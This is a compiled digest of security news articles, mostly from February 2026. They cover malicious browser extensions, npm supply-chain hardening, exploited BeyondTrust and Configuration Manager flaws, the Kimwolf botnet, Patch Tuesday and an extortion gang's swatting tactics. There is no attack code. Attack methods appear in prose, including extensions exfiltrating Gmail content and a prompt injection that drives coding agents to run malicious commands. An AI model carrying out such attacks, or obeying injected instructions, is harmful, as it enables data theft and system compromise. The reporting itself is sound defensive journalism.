"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."

VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.

Fake AI Chrome Extensions Steal Credentials, Emails

The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.

"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.

The names of the malicious extensions are as follows -

Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.

The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.

"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."

287 Chrome Extensions Exfiltrate Browsing History

The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.

A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.

"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.

Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.

Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.

[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:15:00 +0530
Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html

[TAM METİN - 833 kelime]
In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.

Let’s start with the original problem

Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.

To address this, npm made the following changes:

npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.

The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.

In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.

Two important issues remain

First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).

Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.

These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.

To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.

In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.

In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.

Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.

More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.

At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.

In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.

This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.

We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.

In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.

[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 14:04:00 +0530
Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html

[TAM METİN - 864 kelime]
Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.

BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.

It has been patched in the following versions -

Remote Support - Patch BT26-02-RS, 25.3.2 and later

Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later

The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.

CISA Adds 4 Flaws to KEV Catalog

The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -

CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.

CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.

CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.

CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.

It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.

The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.

However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.

As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.

Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.

The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.

The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.

An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.

"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."

"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."

In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.

[TAM METİN - 434 kelime]
CISA ordered U.S. government agencies on Thursday to secure their systems against a critical Microsoft Configuration Manager vulnerability patched in October 2024 and now exploited in attacks.

Microsoft Configuration Manager (also known as ConfigMgr and formerly System Center Configuration Manager, or SCCM) is an IT administration tool for managing large groups of Windows servers and workstations.

Tracked as CVE-2024-43468 and reported by offensive security company Synacktiv, this SQL injection vulnerability allows remote attackers with no privileges to gain code execution and run arbitrary commands with the highest level of privileges on the server and/or the underlying Microsoft Configuration Manager site database.

"An unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the target environment which are processed in an unsafe manner enabling the attacker to execute commands on the server and/or underlying database," Microsoft explained when it patched the flaw in October 2024.

At the time, Microsoft tagged it as "Exploitation Less Likely," saying that "an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product."

However, Synacktiv shared proof-of-concept exploitation code for CVE-2024-43468 on November 26th, 2024, almost two months after Microsoft released security updates to mitigate this remote code execution vulnerability.

While Microsoft has not yet updated its advisory with additional information, CISA has now flagged CVE-2024-43468 as actively exploited in the wild and has ordered Federal Civilian Executive Branch (FCEB) agencies to patch their systems by March 5th, as mandated by the Binding Operational Directive (BOD) 22-01.

"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise," the U.S. cybersecurity agency warned.

"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable."

Even though BOD 22-01 applies only to federal agencies, CISA encouraged all network defenders, including those in the private sector, to secure their devices against ongoing CVE-2024-43468 attacks as soon as possible.

[5] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 04:31:01 -0500
Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/

[TAM METİN - 484 kelime]
Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.

Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.

Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.

As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.

"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.

"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."

Service‑side fix pushed in early February

This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.

Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.

"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."

Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.

[6] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 17:57:54 -0500
Link: https://www.bleepingcomputer.com/news/security/russia-tries-to-block-whatsapp-telegram-in-communication-blockade/

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters

A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

